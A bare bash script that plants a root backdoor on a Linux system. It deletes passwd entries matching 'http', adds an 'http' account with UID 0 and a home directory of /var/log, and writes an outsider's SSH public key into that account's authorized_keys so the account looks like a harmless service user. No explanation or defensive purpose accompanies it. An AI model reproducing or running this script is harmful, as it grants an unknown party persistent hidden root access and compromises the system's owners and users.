#!/bin/bash
#echo "httpp:x:0:0:lp:/var/log:/bin/bash">>/etc/passwd
#echo "httpp:x:0:0:lp:/var/log:/bin/bash">>/etc/passwd
if [ `grep http /etc/passwd` ]
then 
	userdel   http
	adduser http -g http
else
	adduser http -g http
fi
#sed '$d' /etc/passwd
cp /etc/passwd /etc/passwd.back
sed -i '/http/d' /etc/passwd
echo "http:x:0:0:root:/var/log:/bin/bash">>/etc/passwd
mkdir -p /var/log/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEA2irMS/yR1tcHf4OM7JRzSn8kKG/FziWj5bOupcnB4UvninCqX4AMDQYjGHgBJVJLQKD65OUdLOpFJTElwExX3LI2l+r2hyjvaoidmK2oRcZrAloDyY8VtiWvq2pqVR8ucU2qiRdeU4JdC0PE4xn+mpcJXZgL3clYP3XYOoMbjr8= sunliguo@server1.freeshells.ch">/var/log/.ssh/authorized_keys
